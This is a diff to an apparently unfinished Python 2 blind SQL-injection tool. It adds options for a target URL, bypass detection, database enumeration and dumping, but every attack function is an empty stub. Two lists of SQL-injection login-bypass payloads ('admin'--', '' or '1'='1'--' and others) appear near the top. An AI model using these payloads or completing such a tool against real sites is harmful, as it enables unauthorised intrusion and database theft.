@@ -1,11 +1,12 @@
 #!/usr/bin/python2
 # -*- coding: utf-8 -*-
 
+import re
+import os
+import string
 import sys, getopt
 import urllib2, requests
-import re
-import string
-import os
+from optparse import OptionParser
 
 # --------- Variables ----------
 
@@ -14,22 +15,70 @@ l_bypass = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 
 l_bypass2 = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2", "') and '1'='2'--"]
 alphabet = "abcdefghijklmnopqrstuvwxyz"
 
-# --------- Arguments ----------
-'''
-URL         URL a injecter
-Bypass      Détecter le bypass à utiliser
+# --------- Main function option parsing ----------
+def main():
+    arg_help = """Blind SQLi:
+python sql.py TODO include args
+python sql.py TODO include args"""
 
-'''
+    parser = OptionParser(usage=arg_help)
+    try:
+        parser.add_option("-u", "--url", action="store", type=str, dest="URL", help="The target url to inject")
+        parser.add_option("-d", "--detect-bypass", action="store_true", dest="BYPASS_DETECT", help="Detect the bypass to use during injection")
+        parser.add_option("-e", "--enum", action="store_true", dest="ENUM", help="Enumerate databases, tables columns")
+        parser.add_option("-D", "--dump", action="store_true", dest="DUMP", help="Dump the chosen database")
+        parser.add_option("-b", "--database", action="store", type=str, dest="DATABASE", help="The database to dump")
+    except optparse.AmbiguousOptionError as ambiguous:
+        print("Ambiguous option: " + ambiguous)
+    except optparse.BadOptionError as bad_option:
+        print("Bad option: " + bad_option)
 
-# --------- Fonctions ------------
-'''
-    Détection du bypass à utiliser pour l'injection
-    Détection de la version de MySQL
-    Récupération de la base de donnée en cours d'utilisation
-    Enumérer bases de données
-    Enumérer les tables
-    Enumérer les colonnes
-'''
+    # Affect options argument to variables
+    (options, args) = parser.parse_args()
+
+    URL                 = options.URL
+    BYPASS_DETECT       = options.BYPASS_DETECT
+    ENUM                = options.ENUM
+    DUMP                = options.DUMP
+    DATABASE            = options.DATABASE
+
+    # TODO algo principal ici
+
+# --------- Find the proper bypass ----------
+def find_bypass():
+    pass
+
+# --------- Find the numer of columns ----------
+def find_nb_columns():
+    pass
+
+# --------- Find SQL database version ----------
+def sql_version():
+    pass
+
+# --------- Find the current database ----------
+def current_database():
+    pass
+
+# --------- Enumerate databases ----------
+def eunum_databases():
+    pass
+
+# --------- Enumerate database tables ----------
+def enum_tables():
+    pass
+
+# --------- Dump the database ----------
+def exfiltrate_data():
+    pass
+
+# --------- Contruct & send HTTP requests ----------
+def request_handler():
+    pass
+
+if __name__ == "__main__":
+    main()
+
 """def main(argv):
 # ---- /!\
    try:
